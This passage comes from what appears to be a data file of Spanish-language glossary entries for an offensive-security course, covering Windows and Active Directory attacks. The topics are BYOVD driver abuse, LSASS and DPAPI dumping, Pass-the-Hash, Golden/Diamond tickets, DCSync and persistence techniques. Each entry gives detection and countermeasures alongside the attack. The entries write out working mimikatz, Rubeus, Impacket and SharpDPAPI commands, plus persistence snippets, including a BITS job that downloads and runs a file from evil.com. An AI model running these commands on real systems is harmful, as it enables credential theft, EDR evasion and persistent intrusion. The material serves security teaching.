team):**\n\n**LSASS access:**\n• **Sysmon Event 10** — process access to LSASS with GrantedAccess 0x1010 (dump)\n• **Defender for Endpoint** — flag directo sobre procdump/comsvcs sobre LSASS\n• **Attack Surface Reduction (ASR) rules** — 'Block credential stealing from LSASS'\n\n**Contramedidas:**\n• **LSASS as PPL** (Windows 8.1+) — Credential Guard\n• **RunAsPPL registry key** habilitado\n• **Deshabilitar WDigest** (cleartext passwords in memory) — default deshabilitado desde Win 8.1\n• **LAPS** — random local admin passwords\n• **Kerberos-only auth** (deshabilitar NTLM en dominio)\n• **Print Spooler off** en DCs post-PrintNightmare\n\n**PrintNightmare defense:**\n• Deshabilitar Print Spooler donde no se necesite\n• Point-and-Print restriction via GPO\n• Package Point and Print restrictions\n\n> 💡 En 2024, **LSASS PPL bypasses siguen apareciendo**. Defensa en profundidad (Credential Guard + LAPS + Kerberos-only) es imprescindible.\n> ⚠️ Dump de LSASS es **RED FLAG obvia** en cualquier EDR moderno. Alternativas: nanodump, PPLdump, o pivoting a otra técnica (kerberoasting, DCSync).",
    examples: [
      "PrintNightmare 2021: 6+ meses de bypasses sucesivos post-first-patch.",
      "SharpDPAPI + backup key + DA hash: exfil de todas las passwords de dominio guardadas en Chrome/Outlook.",
      "OSCP Windows AD track: procdump lsass → mimikatz sekurlsa → NTLM hashes → Pass-the-Hash.",
    ],
    related: ["Mimikatz y robo de credenciales", "Ataques a Active Directory", "AV/EDR evasion moderna: AMSI, ETW, syscall directas", "Meterpreter avanzado: migrate, extensions, priv escalation"],
  },
  {
    id: 358,
    module: 32,
    term: "BYOVD y kernel exploits Windows",
    short: "Vulnerable drivers signed by Microsoft-approved vendors permiten kernel-mode code execution. Bypass total de EDR user-mode.",
    detail:
      "**BYOVD** (*Bring Your Own Vulnerable Driver*) es la técnica moderna para bypass total de EDR: cargar un driver **legítimamente firmado** pero vulnerable, y usar sus bugs para kernel-mode operations.\n" +
      "\n**Por qué funciona:**\nWindows requiere que kernel drivers estén firmados (Driver Signature Enforcement, DSE). Microsoft mantiene una **allowlist implícita** — cualquier driver firmado por un cert válido puede cargarse.\n" +
      "\nMuchos vendors legítimos (Intel, Nvidia, ASUS, MSI) publicaron drivers con bugs de kernel security. Aunque el driver sea vulnerable, sigue estando firmado. El atacante lo carga y explota sus bugs.\n" +
      "\n**Drivers famosos abusables:**\n\n**gmer.sys, procexp.sys:**\nAnti-rootkit tools que exponen APIs para leer/escribir kernel memory. Abusables como primitives.\n\n**iqvw64e.sys (Intel Ethernet):**\nBugs de kernel memory access. Cargable en cualquier Windows con Intel drivers.\n\n**RTCore64.sys (MSI Afterburner):**\nDMA ilimitado a physical memory. Usado en ~40% de public BYOVD tools.\n\n**gdrv.sys (Gigabyte):**\nR/W physical memory sin auth. CVE-2018-19320.\n\n**wnbios.sys (Winring0):**\nOverclock utility. R/W CPU MSRs (Model Specific Registers) → total control.\n\n**Y muchos más** — repositorio 'loldrivers.io' cataloga 350+ drivers vulnerables conocidos.\n\n**Herramientas de exploitation:**\n\n**KDMapper (2020):**\n```\nKDMapper.exe payload.sys\n# Carga arbitrary unsigned driver usando iqvw64e.sys como primitive\n```\nMap driver sin firma a kernel memory abusando el vuln driver.\n\n**EDRSandBlast (2022):**\nUsa un vuln driver para:\n• Unhook EDR ntoskrnl callbacks\n• Disable EDR kernel notifications\n• Restore original SSDT (System Service Descriptor Table)\n• Kill EDR process from kernel-mode\n\n```\nEDRSandBlast.exe -v --usermode --kernelmode\n```\n\n**BadZure:**\nSimilar, PowerShell-based. Fácil de usar en post-compromise.\n\n**KaramamonoZubie / DriveByFail:**\nAlternativas focused en specific drivers.\n\n**PPLBlade:**\nUsa vuln driver para bypass LSASS PPL protection → dump credentials.\n\n**Casos observados en la wild:**\n\n**BlackByte ransomware (2022):**\nUsó RTCore64.sys para disable EDR pre-encryption.\n\n**AvosLocker (2022):**\nDeploy driver GMER firmado para kill AV/EDR products.\n\n**Cuba ransomware (2023):**\nDrivers Avast (leaked cert!) para bypass endpoint protection.\n\n**North Korean Lazarus (2023):**\nBYOVD específico para wipe forensic tools.\n\n**Windows Driver Blocklist:**\nMicrosoft mantiene una **blocklist policy** (Microsoft Recommended Driver Block Rules). Enable con Windows Defender Application Control (WDAC) o `HVCI` (Hypervisor-protected Code Integrity):\n```powershell\n# Habilitar el blocklist\nSet-CIPolicySetting -Enable ... -Policy $blockRulesPath\n```\n\n**Bypass de blocklist:**\nAttackers publican nuevos drivers vulnerables descubiertos cada mes. Blocklist tiene lag (updates cada 6-12 meses en releases mayores). **En 2024, ~200 drivers en blocklist official pero 350+ conocidos.**\n\n**Otros vectors kernel exploitation:**\n\n**HackSysExtreme Vulnerable Driver (HEVD):**\nDriver INTENTIONALLY vulnerable, para practice. Excelente para aprender kernel exploitation.\n\n**Windows kernel CVEs modernas:**\n• **CVE-2022-26925 (LSA spoofing)** — coerción de auth\n• **CVE-2023-28252 (CLFS driver)** — LPE\n• **CVE-2023-29336 (Win32k)** — LPE\n\n**Contramedidas:**\n• **HVCI enabled** — separates kernel VA space from EDR memory\n• **Microsoft Vulnerable Driver Blocklist** habilitada\n• **WDAC (Application Control)** — allowlist of allowed drivers\n• **Attack Surface Reduction (ASR) rules** — 'Block abuse of exploited vulnerable signed drivers'\n• **Update blocklist regularly** — no confiar en la default\n• **EDR con kernel driver awareness** — CrowdStrike/SentinelOne cross-check contra loldrivers.io\n\n> 💡 En 2024 BYOVD es **standard technique** en red team engagements sofisticados y ransomware ops.\n> ⚠️ Loading unsigned drivers requiere **admin privileges** — no es privesc por sí, es **defense evasion post-privesc**.",
    examples: [
      "loldrivers.io: catálogo community de 350+ vulnerable drivers.",
      "EDRSandBlast (Wavestone): open source demonstration de la técnica.",
      "Cuba ransomware 2023: Avast cert leak → deploy driver Avast firmado (legítimo, no patched) → kill AV.",
    ],
    related: ["AV/EDR evasion moderna: AMSI, ETW, syscall directas", "Sliver, Havoc y C2 modernos (post-Cobalt Strike)", "Mimikatz y robo de credenciales", "Meterpreter avanzado: migrate, extensions, priv escalation"],
  },

  // ── M33 · Pivoting y Movimiento Lateral ──────────────────────────────────
  {
    id: 360,
    module: 33,
    term: "Port forwarding y túneles",
    short: "Redirigir puertos a través de una máquina comprometida para alcanzar la red interna.",
    detail:
      "El **port forwarding** usa un host comprometido como **puente** hacia servicios internos no accesibles directamente. Con **SSH** se hacen túneles **local** (`-L`), **remoto** (`-R`) y **dinámico/SOCKS** (`-D`).\n" +
      "ssh -L 8080:10.0.0.50:80 user@pivote\n" +
      "> 💡 El túnel dinámico (-D) + proxychains permite enrutar herramientas enteras por el pivote.",
    examples: [
      "Acceder a una intranet 10.x vía un -L a través del pivote.",
      "ssh -D 1080 + proxychains nmap para escanear la red interna.",
    ],
    related: ["Túneles con chisel y ligolo", "Movimiento lateral", "Streams y redirección"],
  },
  {
    id: 361,
    module: 33,
    term: "Túneles con chisel y ligolo",
    short: "Herramientas modernas para tunelizar cuando no hay SSH disponible.",
    detail:
      "Cuando el pivote no tiene SSH (típico en Windows), se usan herramientas dedicadas:\n" +
      "• **chisel** — túnel TCP/UDP sobre HTTP, cliente-servidor.\n" +
      "• **ligolo-ng** — crea una interfaz de red hacia la red interna, muy cómodo.\n" +
      "• **sshuttle** — 'VPN pobre' sobre SSH para subredes enteras.\n" +
      "> 💡 ligolo-ng evita el dolor de cadenas de port-forwards manuales.",
    examples: [
      "chisel para tunelizar desde un Windows comprometido.",
      "ligolo-ng para enrutar toda una subred interna.",
    ],
    related: ["Port forwarding y túneles", "Movimiento lateral", "VPN: IPSec vs WireGuard"],
  },
  {
    id: 362,
    module: 33,
    term: "Movimiento lateral",
    short: "Saltar de una máquina a otra dentro de la red usando credenciales y protocolos legítimos.",
    detail:
      "El **movimiento lateral** expande el compromiso por la red usando técnicas que abusan de funciones legítimas: **PsExec**, **WMI**, **WinRM**, **RDP** y **Pass-the-Hash** (autenticarse con el hash sin la contraseña). El objetivo final suele ser el **Domain Admin** / Domain Controller.",
    examples: [
      "psexec.py con un hash robado para una shell en otro host.",
      "WinRM (evil-winrm) para moverse con credenciales válidas.",
    ],
    related: ["Túneles con chisel y ligolo", "Mimikatz y robo de credenciales", "Ataques a Active Directory"],
  },
  {
    id: 363,
    module: 33,
    term: "Defensa contra el movimiento lateral",
    short: "Segmentación, mínimo privilegio y monitoreo contienen al atacante interno.",
    detail:
      "Una vez dentro, el atacante busca expandirse; las defensas lo **contienen**:\n" +
      "• **Microsegmentación** — separar la red para que un host no llegue a todos.\n" +
      "• **Mínimo privilegio + LAPS** — limitar dónde sirve una credencial robada.\n" +
      "• **Deshabilitar SMBv1 / restringir RDP** — cerrar vías clásicas.\n" +
      "• **Monitoreo** — detectar uso anómalo de cuentas y herramientas (PsExec).",
    examples: [
      "Segmentar para que un PC de oficina no alcance los servidores.",
      "LAPS para que cada equipo tenga una contraseña local distinta.",
    ],
    related: ["Movimiento lateral", "Defensa en profundidad", "DMZ y segmentación de red"],
  },
  {
    id: 364,
    module: 33,
    term: "Pass-the-Hash, Pass-the-Ticket, Overpass-the-Hash",
    short: "Reutilizar hashes NTLM y tickets Kerberos capturados sin necesitar el password cleartext. La base del lateral movement en AD.",
    detail:
      "Tras capturar credentials en LSASS o SAM, hay 3 técnicas core para reutilizarlas — sin necesitar el password cleartext.\n" +
      "\n**Pass-the-Hash (PtH, Hernan Ochoa 1997):**\n\nEl NTLM auth protocol usa el hash NTLM del password como shared secret. Si capturamos el hash, podemos autenticarnos con él directamente — no necesitamos el password cleartext.\n\n```bash\n# Impacket (Linux)\npsexec.py -hashes aad3b435...31d6cfe0d16ae931b73c59d7e0c089c0 CORP.LOCAL/admin@target\npsexec.py -hashes :31d6cfe0d16ae931b73c59d7e0c089c0 CORP.LOCAL/admin@target  # solo NT hash\nwmiexec.py -hashes ... admin@target                                        # stealth via WMI\nsmbexec.py -hashes ... admin@target                                        # con SMB service\n\n# NetExec (batch)\nnxc smb 192.168.1.0/24 -u admin -H 31d6cfe0d16ae931b73c59d7e0c089c0 --local-auth\n\n# Windows post-mimikatz\nmimikatz # sekurlsa::pth /user:admin /domain:corp /ntlm:31d6cfe0d16ae931b73c59d7e0c089c0\n# Spawns cmd.exe con auth as admin — netauth aparece como el domain admin\n```\n\n**PtH funciona solo con NTLM auth** — servicios que lo aceptan (SMB, WMI, WinRM, MSSQL con Windows Auth, RDP con Restricted Admin mode).\n\n**Kerberos-only environments** (deshabilitando NTLM) matan PtH.\n\n**Pass-the-Ticket (PtT):**\n\nSi capturamos tickets Kerberos (TGT o TGS) en memoria de otro user, podemos importarlos y autenticarnos como ese user.\n\n```bash\n# Extraer tickets con mimikatz\nmimikatz # sekurlsa::tickets /export\n# Guarda .kirbi files en el directorio\n\n# Windows: import ticket para uso subsecuente\nmimikatz # kerberos::ptt admin.kirbi\nklist   # verificar\ndir \\\\dc.corp.local\\C$   # accede como el user del ticket\n\n# Linux: convertir .kirbi a .ccache + KRB5CCNAME\ncat admin.kirbi | base64 -w 0 > admin.b64\nticketConverter.py admin.kirbi admin.ccache\nexport KRB5CCNAME=admin.ccache\npsexec.py -k -no-pass CORP.LOCAL/admin@target\n```\n\n**Overpass-the-Hash (OPtH, Skip Duckwall + Benjamin Delpy 2014):**\n\nHybrid technique — con el NTLM hash **request nuevos Kerberos tickets** (en vez de usar NTLM directamente). Blend con Kerberos-only environments.\n\n```bash\n# Impacket (Linux)\ngetTGT.py -hashes ...:31d6cfe0d16ae931b73c59d7e0c089c0 CORP.LOCAL/admin@dc.corp.local\n# Genera TGT en .ccache\nexport KRB5CCNAME=admin.ccache\npsexec.py -k -no-pass CORP.LOCAL/admin@target\n\n# Rubeus (Windows)\nRubeus.exe asktgt /user:admin /rc4:31d6cfe0d16ae931b73c59d7e0c089c0 /ptt\n```\n\n**Ventaja OPtH vs PtH:**\n• Uses Kerberos → no aparece como NTLM auth event (menos flags en SIEM)\n• Works even si NTLM está deshabilitado\n• Aparece como legitimate authentication activity\n\n**Herramientas modernas:**\n\n**Rubeus (SpecterOps):**\nEl swiss-army knife de Kerberos post-2018. Ticket manipulation, S4U attacks, golden/silver ticket, kerberoasting.\n```\nRubeus.exe asktgt /user:X /password:Y /ptt\nRubeus.exe tgtdeleg           # extrae TGT de la sesión\nRubeus.exe ptt /ticket:base64...\nRubeus.exe s4u /impersonateuser:admin /msdsspn:CIFS/target ...   # S4U ticket forge\n```\n\n**Impacket** — el equivalente Linux/Python:\n```\ngetTGT.py, getST.py, ticketer.py (silver/golden), findDelegation.py\n```\n\n**Detection (blue team):**\n\n• **Event 4624 con Logon Type 3 (network) + LogonProcess NtLmSsp**: PtH típico.\n• **Kerberos tickets con RC4** encryption (Kerberoasting o OPtH signal).\n• **Cross-domain ticket flags** anómalos.\n• **CrowdStrike/SentinelOne** detect memory access patterns de mimikatz.\n\n**Contramedidas:**\n• **Deshabilitar NTLM** en el dominio (o restringir en DCs)\n• **Kerberos AES-only** — RC4 deshabilitado\n• **Credential Guard** — protege LSASS de dump con VBS/Hyper-V isolation\n• **LAPS** — passwords locales random rotated → un hash comprometido no reutilizable en otros hosts\n• **Protected Users group** — negá NTLM para users en este grupo, TGT lifetime shorter\n• **Restricted Admin Mode** en RDP — evita transmitir hash/password al target\n> 💡 En un pentest AD moderno, **OPtH + Rubeus asktgt** es la técnica canonical post-mimikatz.\n> ⚠️ PtH plain es **muy detectado en 2024** por EDR/SIEM. OPtH es más stealth.",
    examples: [
      "OSCP AD track: mimikatz sekurlsa → NTLM hash → PtH con nxc a través del dominio.",
      "APTs y ransomware: PtH es #1 technique post-domain-admin compromise (Trickbot, Ryuk, Conti).",
      "Impacket psexec.py + hash: quick shell as admin en cualquier Windows target.",
    ],
    related: ["Ataques a Active Directory", "Movimiento lateral", "PowerShell ofensivo", "Kerberoasting y AS-REP roasting"],
  },
  {
    id: 365,
    module: 33,
    term: "Silver, Golden, Diamond y Sapphire tickets",
    short: "Forge de tickets Kerberos con hashes de service account (silver) o krbtgt (golden/diamond/sapphire). Persistencia + acceso arbitrario.",
    detail:
      "Kerberos usa 2 tipos de tickets: **TGT** (Ticket Granting Ticket, obtenido al login) y **TGS** (Ticket Granting Service, per-service). Ambos son firmados por el KDC. Si un atacante obtiene la clave que firma los tickets, puede **forge tickets arbitrarios**.\n" +
      "\n**Silver Ticket (Benjamin Delpy 2014):**\n\nForge TGS para un servicio específico usando **el hash NTLM del service account** de ese servicio.\n\n**Impact:**\n• Acceso a UN servicio específico (CIFS de un file server, HTTP de un IIS, MSSQL de un DB, etc.).\n• Sin contactar al DC → **no aparece en logs del DC** (más stealth).\n• Requiere solo el hash del service account (Kerberoasteable → PtH).\n\n**Generación con Rubeus:**\n```\nRubeus.exe silver /service:CIFS/fileserver.corp.local /rc4:HASH_NTLM_SERVICE_ACCT /user:AttackerName /domain:corp.local /sid:S-1-5-21-... /ptt\n```\n\n**Impacket:**\n```bash\nticketer.py -spn CIFS/fileserver.corp.local -nthash HASH_NTLM_SERVICE_ACCT -domain-sid S-1-5-21-... -domain CORP.LOCAL AttackerName\n# Genera AttackerName.ccache\nexport KRB5CCNAME=AttackerName.ccache\nsmbclient.py CORP.LOCAL/AttackerName@fileserver.corp.local\n```\n\n**Golden Ticket (Delpy 2014):**\n\nForge TGT usando **el hash del `krbtgt` account** — la cuenta que firma TODOS los TGTs del dominio. Con krbtgt hash, control total.\n\n**Impact:**\n• Puede pedir TGS para cualquier servicio de cualquier user\n• Ticket lifetime configurable (default max 10 años!)\n• **Persistencia perfecta** — mientras el krbtgt no rote, el ticket funciona\n• krbtgt password nunca se rota automáticamente (a menos que un DA lo haga explícitamente)\n\n**Obtener krbtgt hash:**\n• DCSync (requires DA privileges — replicating directory changes)\n• Dump NTDS.dit (requires DA + physical access to DC o backup DIT)\n\n```bash\n# DCSync con impacket\nsecretsdump.py CORP.LOCAL/DA_user:password@dc.corp.local -just-dc-user krbtgt\n\n# mimikatz on DC\nmimikatz # lsadump::dcsync /domain:corp.local /user:krbtgt\n```\n\n**Forge:**\n```\n# Rubeus\nRubeus.exe golden /user:Administrator /domain:corp.local /sid:S-1-5-21-... /krbtgt:HASH_KRBTGT /ptt\n\n# Impacket\nticketer.py -nthash HASH_KRBTGT -domain-sid S-1-5-21-... -domain CORP.LOCAL Administrator\n# Genera Administrator.ccache válido\n\n# mimikatz\nmimikatz # kerberos::golden /user:Administrator /domain:corp.local /sid:S-1-5-21-... /krbtgt:HASH /ptt\n```\n\n**Diamond Ticket (SpecterOps, 2022):**\n\nAvance sobre Golden — en vez de crear TGT desde cero (que puede ser detectado por anomalías en flags/lifetime), **modificar un TGT legítimo** conservando su estructura y solo agregando arbitrary group memberships. **Mucho más stealth** contra detection avanzada.\n\n```\nRubeus.exe diamond /ticket:legit_tgt.kirbi /user:Administrator /groups:512,516,519 /ptt\n```\n\n**Sapphire Ticket (nuevo 2023):**\n\nEvolution: forge un TGT que apunta a un user existente con groups **inheriting** legítimos. Combina Diamond con S4U for even more stealth.\n\n**Detection:**\n\n**Golden Ticket detection:**\n• Kerberos tickets con **lifetime anómalo** (>10 horas o >10 años).\n• TGTs con **encryption RC4** cuando el dominio usa AES.\n• Users con SIDs **ausentes o mal formateados**.\n• Windows Event 4769 (TGS request) con user \"no existe\" que sin embargo obtiene TGS.\n\n**Silver Ticket:**\n• Sin logs en DC (bypasses)\n• PAC validation por parte del servicio — si el servicio hace `KRB_TICKET_LOGON` extended check con el DC, el ticket falso falla.\n\n**Contramedidas:**\n\n**Preventive:**\n• **Rotar krbtgt password 2 veces** (con `Reset-KrbtgtKeys.ps1`) — invalida todos los golden tickets outstanding.\n• **Automated krbtgt rotation** cada 6-12 meses.\n• **AES-only Kerberos** — dificulta forge (aunque no imposible).\n• **Protected Users group** para high-value accounts.\n\n**Detective:**\n• **Sysmon Event 4769/4624** con anomaly detection sobre TGT lifetime.\n• **BloodHound** para identify accounts con permisos DCSync.\n\n**S4U Attacks (Rubeus asktgs):**\n\nS4U2Self + S4U2Proxy — abuse de Kerberos delegation:\n```\nRubeus.exe s4u /impersonateuser:Administrator /msdsspn:CIFS/target /user:MachineAcct$ /rc4:HASH /ptt\n```\nCon control de la machine account de una computer que tenga **Constrained Delegation** → impersonate cualquier user contra services delegated.\n\n> 💡 **Golden Ticket** es la técnica de persistencia post-domain-compromise más impactante. Un red team con DA hash y no rotate = acceso durante meses.\n> ⚠️ **Diamond > Golden** en engagement con blue team maduro. Golden es DETECTED por reglas conocidas.",
    examples: [
      "APT29 (Cozy Bear, 2020): Golden Tickets como persistencia en SolarWinds compromise victims.",
      "Colonial Pipeline (2021 initial vector): DA compromise + Silver Ticket para file server access.",
      "SpecterOps Diamond Ticket paper: technique disclosed publicly en 2022.",
    ],
    related: ["Kerberoasting y AS-REP roasting", "Pass-the-Hash, Pass-the-Ticket, Overpass-the-Hash", "Ataques a Active Directory", "LDAP enumeration y BloodHound"],
  },
  {
    id: 366,
    module: 33,
    term: "DCSync, DCShadow y DPAPI dumping",
    short: "DCSync replica NTDS.dit remoto (dump all creds). DCShadow crea DC falso (persistencia total). DPAPI recover credentials cifradas.",
    detail:
      "Tres técnicas para robar credentials post-compromise en AD. Requieren distintos privilege levels pero todos son 'game over' cuando funcionan.\n" +
      "\n**DCSync (Delpy + Le Toux, 2015):**\n\nAbuse de la **replicación normal de Active Directory**. Cualquier user con \"Replicating Directory Changes\" y \"Replicating Directory Changes All\" permissions puede pedir a un DC que le mande cualquier user's password data — como si fuera otro DC replicating.\n\n**Por defecto tienen esos permisos:**\n• Domain Admins, Enterprise Admins, Administrators\n• Domain Controllers\n• Users manualmente delegados (raro)\n\n**Attack:**\n```bash\n# Con impacket (secretsdump)\nsecretsdump.py CORP.LOCAL/DAuser:password@dc.corp.local\n# Output: NTLM hashes de TODOS los users del dominio + krbtgt\n\n# Específico un user\nsecretsdump.py CORP.LOCAL/DAuser:password@dc.corp.local -just-dc-user krbtgt\nsecretsdump.py CORP.LOCAL/DAuser:password@dc.corp.local -just-dc-user administrator\n\n# Con mimikatz on Windows\nmimikatz # lsadump::dcsync /domain:corp.local /user:krbtgt\nmimikatz # lsadump::dcsync /domain:corp.local /all /csv\n```\n\n**Impact:**\n• krbtgt hash → Golden Tickets\n• Domain Admin passwords → cualquier acceso\n• Historic password hashes → cracks + reuse patterns\n\n**DCShadow (Delpy + Le Toux, 2018):**\n\nMás avanzado. En vez de solicitar data del DC, **el atacante registra su máquina como un DC falso** en el bosque, hace cambios (agregar SID history, cambiar group memberships), y replica al DC real.\n\n**Impact:**\n• **Persistencia extrema** — cambios como si fueran replicación normal, sin logs anómalos\n• Agregar SID de \"Enterprise Admins\" a un user regular sin dispersar credenciales\n• Difícil de detectar (blue team asume replication events son legit)\n\n```powershell\n# mimikatz # lsadump::dcshadow\n# Requiere DA privilege temporary + reg mods\n```\n\nComplicado en modo defensive setups. Requires Domain Admin equivalent inicialmente. **Uso primario: red team ops con persistencia largo plazo**.\n\n**DPAPI dumping (con backup key):**\n\n**DPAPI Master Keys** están cifrados con user password hash. Pero AD también genera **domain backup keys** (RSA) — copia de escape del DA para recuperar files cifrados de users que perdieron el password.\n\nCon domain backup key + acceso a filesystem del user, se puede decrypt DPAPI blobs de TODOS los users del dominio.\n\n```bash\n# 1. Extract domain backup key (requires DA)\nSharpDPAPI.exe backupkey /server:dc.corp.local /pvk:backupkey.pvk\n\n# 2. Enumerate + decrypt DPAPI blobs de todos los users\nSharpDPAPI.exe triage /pvk:backupkey.pvk\n\n# 3. Decrypt browser saved credentials\nSharpChrome.exe logins /pvk:backupkey.pvk\n\n# 4. WiFi passwords\nSharpDPAPI.exe wifi /pvk:backupkey.pvk\n```\n\n**Trove typical:**\n• Chrome/Edge saved passwords → cred stuffing\n• Outlook profiles → email access\n• PuTTY sessions → SSH targets\n• WinSCP → server access\n• Windows Credential Manager → RDP saved, Git creds, etc.\n\n**NTDS.dit offline dump:**\n\nSi tenés acceso físico o backup del DC:\n```bash\n# From Windows DC directly\nntdsutil \"ac in ntds\" \"ifm\" \"create full C:\\temp\" q q\n# Copies ntds.dit + SYSTEM registry hive\n\n# Parse offline (Linux)\nimpacket-secretsdump -ntds ntds.dit -system SYSTEM LOCAL\n```\n\n**Detection:**\n\n**DCSync detection:**\n• **Event 4662** en DCs con Access Mask 0x00000100 (DS-Replication-Get-Changes)\n• **DirectoryReplicationOperations** anómalos desde IPs que no son DCs\n• **Sysmon** en cliente detecta secretsdump/mimikatz process patterns\n\n**DCShadow detection:**\n• Cambios de replication con **serverGUID no reconocido** en el forest\n• **nTDSDSA** entries anómalos\n• **Delegated Access Rights** modifications inesperados\n\n**Contramedidas:**\n• **Least privilege** en \"Replicating Directory Changes\" — solo DCs y accounts críticos\n• **Auditing 4662** habilitado con alerting sobre Replicating access\n• **Tier 0 asset protection** — DCs en zone aislada, monitoring especializado\n• **JIT (Just-in-time) privileges** para DA accounts\n• **PAM (Privileged Access Management)** — DA passwords rotan por request, session recording\n> 💡 **DCSync es la técnica #1 para dump credenciales del dominio**. Todo pentest AD moderno la usa post-DA.\n> ⚠️ **NTDS.dit backup en unprotected share** es hallazgo común — busca `\\\\backup-server\\backups\\*ntds*`.",
    examples: [
      "Ryuk / Conti ransomware: DCSync como paso obligatorio pre-encryption for maximum leverage.",
      "SharpDPAPI + backup key = extract todas las Chrome passwords guardadas de todos los employees.",
      "APT38 (North Korea): DCShadow para persistir en SWIFT-linked institutions.",
    ],
    related: ["Ataques a Active Directory", "Silver, Golden, Diamond y Sapphire tickets", "Pass-the-Hash, Pass-the-Ticket, Overpass-the-Hash", "PrintNightmare, DPAPI y LSASS dumping"],
  },
  {
    id: 367,
    module: 33,
    term: "Persistence techniques modernas (Windows)",
    short: "Scheduled Tasks abusables, WMI subscriptions, DLL sideloading, COM hijacking. MITRE ATT&CK TA0003 completo.",
    detail:
      "**Persistence** es cómo el atacante mantiene acceso al target aunque reboot, logout, o password change. MITRE ATT&CK Tactic **TA0003** cataloga ~20 técnicas primary. Las más usadas en 2024:\n" +
      "\n**Scheduled Tasks (T1053.005):**\nCorren a intervalos o eventos. Múltiples ways de create:\n```powershell\n# schtasks (built-in, forensically visible)\nschtasks /create /tn Updater /tr 'powershell -w hidden -e BASE64PAYLOAD' /sc minute /mo 10\n\n# PowerShell native (más stealth)\n$action = New-ScheduledTaskAction -Execute 'powershell.exe' -Argument '-w hidden -File C:\\evil.ps1'\n$trigger = New-ScheduledTaskTrigger -AtLogon\nRegister-ScheduledTask -TaskName 'Updater' -Action $action -Trigger $trigger -User 'SYSTEM'\n```\n\n**Detección:**\n• Sysmon Event 106 (SchTasks creation)\n• Registry writes en `HKLM\\Software\\Microsoft\\Windows NT\\CurrentVersion\\Schedule\\TaskCache`\n\n**GhostTask (2023):**\nBypass logging de scheduled tasks — direct registry write to TaskCache sin API calls trackeadas.\n\n**Registry Run keys (T1547.001):**\nEjecuta al login del user.\n```powershell\n# HKCU (per-user) o HKLM (system)\nSet-ItemProperty -Path 'HKCU:\\Software\\Microsoft\\Windows\\CurrentVersion\\Run' -Name 'Updater' -Value 'C:\\evil.exe'\n```\nLocations: `Run`, `RunOnce`, `RunOnceEx`, `RunServices`, `Winlogon\\Userinit`, `Winlogon\\Shell`.\n\n**WMI Event Subscriptions (T1546.003):**\nSetup un WMI event filter + consumer que dispara payload al ocurrir evento del sistema (login, network change, process spawn).\n```powershell\n# Persistencia via WMI (sin file en disk, muy stealth)\n$Filter = Set-WmiInstance -Namespace root\\subscription -Class __EventFilter -Arguments @{\n    Name = 'Updater'; EventNamespace = 'root\\cimv2'; QueryLanguage = 'WQL';\n    Query = 'SELECT * FROM __InstanceCreationEvent WITHIN 60 WHERE TargetInstance ISA \"Win32_Process\"'\n}\n$Consumer = Set-WmiInstance -Namespace root\\subscription -Class CommandLineEventConsumer -Arguments @{\n    Name = 'Updater'; CommandLineTemplate = 'C:\\evil.exe'\n}\nSet-WmiInstance -Namespace root\\subscription -Class __FilterToConsumerBinding -Arguments @{Filter = $Filter; Consumer = $Consumer}\n```\n**Fileless persistence** — el 'file' vive en el WMI repository, no en NTFS.\n\n**COM Hijacking (T1546.015):**\nColocar DLL malicioso donde una COM class se registra pero no exists. Cuando app carga la COM → runs tu DLL.\n\n**DLL Sideloading (T1574.002):**\nUn app legit carga una DLL desde su directorio o PATH. Colocar tu DLL con el nombre esperado.\n\n**Casos famosos:**\n• Legítimo binary de Microsoft carga `dwrite.dll` desde su directorio\n• Renombrar tu payload → `dwrite.dll` + colocar junto al binary\n• Al ejecutar → tu DLL runs con la firma/reputation del legit binary\n\n**Ejemplos reales:**\n• **APT41 (2020)** — sideloading en múltiples samples\n• **BlackByte** — CobaltStrike sideloaded en app legit\n\n**Services (T1543.003):**\nCrear service que corre como SYSTEM al boot.\n```powershell\nNew-Service -Name Updater -BinaryPathName 'C:\\evil.exe' -StartupType Automatic\nStart-Service Updater\n```\n\n**AlwaysInstallElevated** — MSI que corre con full privileges si registry keys set. Persistence via MSI package.\n\n**Startup folder:**\n```\n%APPDATA%\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\n%PROGRAMDATA%\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\n```\nDrop LNK/EXE — runs al login.\n\n**BITS Jobs (T1197):**\nBackground Intelligent Transfer Service — usado para Windows Updates. Se puede abusar:\n```powershell\nbitsadmin /create updater\nbitsadmin /addfile updater http://evil.com/x C:\\evil.exe\nbitsadmin /SetNotifyCmdLine updater C:\\evil.exe NULL\n```\nEl file se downloads + runs quietly.\n\n**DSRM Password (T1003.003):**\n**Directory Services Restore Mode** admin password on DCs — often set to same as first DA password ever. Backdoor histórico.\n\n**Certificate persistence (T1649):**\n**Golden Certificate** — con acceso a AD CS (Certificate Services) private key, forge certificates for any user. Persistente indefinidamente. Vector primario de \"Certified Pre-Owned\" (SpecterOps 2021).\n\n**Skeleton Key (T1556):**\nInyectar backdoor password en LSASS de un DC. Cualquier user puede autenticarse con el skeleton password + su propio hash. Muere al reboot del DC.\n```\nmimikatz # misc::skeleton\n# Password universal: mimikatz\n```\n\n**Detection general:**\n• **Sysmon Event 12/13/14** — Registry monitoring\n• **Sysmon Event 19/20/21** — WMI Event Filter creation\n• **Sysmon Event 1** — process creation con parent unusual (rundll32 sin args normales)\n• **AutoRuns from Sysinternals** — enumera 200+ locations de auto-start\n• **THOR / Loki** — YARA scanners para malware persistence patterns\n\n**Contramedidas:**\n• **AppLocker/WDAC** — allowlist ejecutables\n• **Audit persistence changes** con Sysmon config comprehensive (Olaf Hartong's config)\n• **Endpoint Detection & Response** — behavioral analysis\n• **Regular AutoRuns audit** — schedule for periodic review\n> 💡 **WMI Event Subscriptions** siguen siendo underdetected — muchas ops de threat hunting no los cubren.\n> ⚠️ Múltiples técnicas combinadas (Run key + WMI + scheduled task) para defense in depth de persistence — killer una no elimina el resto.",
    examples: [
      "APT29 SolarWinds 2020: Golden Ticket + Scheduled Task para 6+ meses de persistence.",
      "Autoruns de Sysinternals: THE tool para revisar persistencia post-compromise investigation.",
      "MITRE ATT&CK TA0003: 20+ subtechniques catalogadas y detectables.",
    ],
    related: ["Movimiento lateral", "Meterpreter avanzado: migrate, extensions, priv escalation", "PowerShell ofensivo", "AV/EDR evasion moderna: AMSI, ETW, syscall directas"],
  },
  {
    id: 368,
    module: 33,
    term: "Cross-forest lateral: SID history, trusts, delegation",
    short: "Constrained/Unconstrained/RBCD delegation, SID history injection, cross-forest trust abuse. Escalar más allá del primer dominio.",
    detail:
      "En enterprises con múltiples dominios/forests (mergers, acquisitions, subsidiarias), un compromise en un dominio puede escalar a otros vía **trust relationships**. Kerberos delegation es el mecanismo, cross-forest trusts son el vector.\n" +
